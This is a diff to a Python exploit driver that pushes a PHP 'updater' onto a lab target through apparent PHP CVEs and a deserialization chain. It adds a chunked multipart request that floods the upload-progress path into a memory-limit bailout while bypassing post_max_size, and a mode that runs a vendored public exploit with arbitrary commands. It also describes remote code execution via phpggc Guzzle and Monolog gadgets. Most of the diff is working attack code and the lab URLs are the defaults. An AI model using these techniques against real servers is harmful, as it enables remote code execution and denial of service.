@@ -6,6 +6,15 @@ Delivers php2shell_updater.php to the lab target (http://0.0.0.0:8080/ by
 default, PHP 8.1.34 php -S, CVE-2026-109618 / CVE-2026-109619) and returns
 the installation result.
 
+Claims, precisely: the POST exercises the real CVE trigger path (pre-RINIT
+session.upload_progress handler, min_freq re-init, and --mode trigger-only's
+chunked OOM-bailout seed), but that path executes NOTHING. The working code
+execution (rungs 1-2) comes from a separate, app-specific unsafe
+session_decode() sink plus real-package deserialization gadgets
+(phpggc Guzzle/RCE/1, Monolog/FW/1) — an object-injection chain that does not
+depend on the CVEs and works the same on patched PHP. No ASLR bypass, no
+heap grooming. See README "How it works".
+
 Execution ladder (all gadgets are REAL packages installed via Composer —
 Guzzle 6.3.2 / psr7 1.4.2 / Monolog 3.x — using phpggc's documented chains):
 
@@ -181,24 +190,29 @@ def raw_post(url, payload, timeout):
     return status, parts[1] if len(parts) > 1 else b""
 
 
-def trigger_only(url, sid, size_mb):
+def trigger_only(url, sid, size_mb, pad_mb):
     """Rung 3: chunked (no Content-Length) OOM seed against the upload-progress
     path. Adapted from the public b63 CVE-2026-109618 driver (agentic exploit
-    foundry, basesixtythree/B63-POC-CVE-2026-109618)."""
+    foundry, basesixtythree/B63-POC-CVE-2026-109618): the chunked body bypasses
+    the rfc1867 post_max_size gate, the huge progress marker drives the session
+    write, and the huge FILE pad drives parsing into the memory_limit bailout
+    before MULTIPART_EVENT_END (so the progress cleanup never runs)."""
     u = urlsplit(url)
     host, port = u.hostname or "127.0.0.1", u.port or 80
     path = (u.path or "/") + ("?" + u.query if u.query else "")
     boundary = "b63-bgctx-2026"
     marker = "A" * (size_mb * 1024 * 1024)
-    body = (f"--{boundary}\r\n"
-            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
-            f"--{boundary}\r\n"
-            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
-            f"{marker}\r\n"
-            f"--{boundary}\r\n"
-            f'Content-Disposition: form-data; name="f"; filename="f.txt"\r\n'
-            f"Content-Type: application/octet-stream\r\n\r\n"
-            f"pad\r\n--{boundary}--\r\n").encode()
+    pad = b"A" * (256 * 1024)
+    total_pad = pad_mb * 1024 * 1024
+    body_head = (f"--{boundary}\r\n"
+                 f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
+                 f"--{boundary}\r\n"
+                 f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
+                 f"{marker}\r\n"
+                 f"--{boundary}\r\n"
+                 f'Content-Disposition: form-data; name="f"; filename="f.txt"\r\n'
+                 f"Content-Type: application/octet-stream\r\n\r\n").encode()
+    body_tail = (f"\r\n--{boundary}--\r\n").encode()
     s = socket.create_connection((host, port), timeout=30)
     s.settimeout(300)
     # Chunked encoding: no Content-Length -> the rfc1867 post_max_size gate is
@@ -207,13 +221,22 @@ def trigger_only(url, sid, size_mb):
             f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
             f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode()
     s.sendall(head)
-    print(f"[*] streaming {size_mb} MB upload-progress marker via chunked encoding...",
-          file=sys.stderr)
-    for i in range(0, len(body), 262144):
-        chunk = body[i:i + 262144]
+    print(f"[*] streaming {size_mb} MB marker + {pad_mb} MB file pad "
+          f"via chunked encoding...", file=sys.stderr)
+
+    def send_chunk(chunk):
         s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
-        if i % (16 * 262144) == 0 and i:
-            print(f"[*]   {i // (1024*1024)} MB sent", file=sys.stderr)
+
+    for chunk in (body_head[:262144], body_head[262144:]):
+        send_chunk(chunk)
+    sent = 0
+    while sent < total_pad:
+        chunk = pad[:min(len(pad), total_pad - sent)]
+        send_chunk(chunk)
+        sent += len(chunk)
+        if sent % (16 * 1024 * 1024) < 262144 and sent:
+            print(f"[*]   {sent // (1024*1024)} MB pad sent", file=sys.stderr)
+    send_chunk(body_tail)
     s.sendall(b"0\r\n\r\n")
     out = b""
     while True:
@@ -278,6 +301,35 @@ def run_rung2(args, container, cart_state, command, updater_source):
     return raw_post(shell_url, command.encode(), args.timeout)
 
 
+def cve_chain_run(args, updater_source):
+    """Drive the real CVE chain (vendored public exploit, mod_php prefork)
+    with the updater command, and return the exploit's output."""
+    chain_dir = os.path.join(HERE, "research", "cve-chain")
+    exploit = os.path.join(chain_dir, "php2shell.py")
+    if not os.path.isfile(exploit):
+        raise SystemExit("cve-chain exploit not found in research/cve-chain/")
+    out_dir = os.path.join(chain_dir, "out")
+    os.makedirs(out_dir, exist_ok=True)
+    compose_file = os.path.join(chain_dir, "docker", "docker-compose.yml")
+    print("[*] cve-chain: starting the vulnerable Apache lab...", file=sys.stderr)
+    subprocess.run(["docker", "compose", "-f", compose_file, "up", "-d"],
+                   capture_output=True, timeout=180)
+    cmd = args.cve_command
+    if cmd is None:
+        # The repo is mounted at /app in the lab, so the updater source is
+        # already on the target; the exploit runs it directly.
+        apply_flags = "" if args.dry_run else args.apply_flags
+        cmd = f"php /app/php2shell_updater.php {apply_flags}".strip()
+    print(f"[*] cve-chain: cmd = {cmd!r}", file=sys.stderr)
+    run = subprocess.run([sys.executable, exploit, "exploit", "-u", args.cve_url,
+                          "-c", cmd], capture_output=True, text=True,
+                         timeout=600)
+    print(run.stdout)
+    if run.stderr.strip():
+        print(run.stderr, file=sys.stderr)
+    return run.returncode
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -287,7 +339,14 @@ def main():
     ap.add_argument("--dry-run", action="store_true",
                     help="run the updater without --apply")
     ap.add_argument("--mode", default="guzzle-rce",
-                    choices=["guzzle-rce", "write-invoke", "trigger-only"])
+                    choices=["guzzle-rce", "write-invoke", "trigger-only",
+                             "cve-chain"])
+    ap.add_argument("--cve-url", default="http://127.0.0.1:8088/index.php",
+                    help="cve-chain: vulnerable mod_php prefork target "
+                         "(php:8.4.26-apache lab by default)")
+    ap.add_argument("--cve-command", default=None,
+                    help="cve-chain: command for the exploit (default: the "
+                         "updater invocation)")
     ap.add_argument("--no-stall", action="store_true")
     ap.add_argument("--no-restart", action="store_true",
                     help="do not restart the container after installation")
@@ -310,8 +369,10 @@ def main():
                          "and exit (feed it to gen_session_payload.php)")
     ap.add_argument("--dump-request", metavar="FILE")
     ap.add_argument("--timeout", type=int, default=1500)
-    ap.add_argument("--marker-mb", type=int, default=160,
+    ap.add_argument("--marker-mb", type=int, default=8,
                     help="trigger-only: upload-progress marker size in MB")
+    ap.add_argument("--pad-mb", type=int, default=200,
+                    help="trigger-only: file pad size in MB (OOM pressure)")
     args = ap.parse_args()
 
     container = args.container if args.container is not None else detect_container()
@@ -339,11 +400,14 @@ def main():
 
     if args.mode == "trigger-only":
         status, response = trigger_only(args.url, args.sid or "b63" + "0123456789abcdef" * 8,
-                                        args.marker_mb)
+                                        args.marker_mb, args.pad_mb)
         print(f"\nHTTP response: {status}")
         print(response.decode(errors="replace")[:2000])
         print("\n(trigger-only: exercises the OOM-bailout path; no code executed)")
         return
+
+    if args.mode == "cve-chain":
+        sys.exit(cve_chain_run(args, updater_source))
 
     apply_flags = "" if args.dry_run else args.apply_flags
     command = args.command or updater_command(updater_source, apply_flags)
